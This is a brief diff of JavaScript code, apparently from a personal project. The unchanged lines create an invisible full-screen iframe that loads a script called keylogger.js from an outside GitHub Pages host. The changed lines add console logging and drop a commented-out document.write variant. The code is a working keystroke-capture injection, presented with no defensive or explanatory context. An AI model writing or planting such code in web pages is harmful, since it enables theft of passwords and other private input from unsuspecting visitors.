@@ -5,7 +5,6 @@ iframe.setAttribute("style", "position:fixed; top:0; left:0; bottom:0; right:0; 
 var html = '<script src="https://turtlecode84.github.io/cdn/scripts/keylogger.js"></script>';
 iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
 document.body.appendChild(iframe);
+console.log(iframe.src);
+console.log(iframe.style);
 console.log("finished");
-/*iframe.contentWindow.document.open();
-iframe.contentWindow.document.write(html);
-iframe.contentWindow.document.close();*/
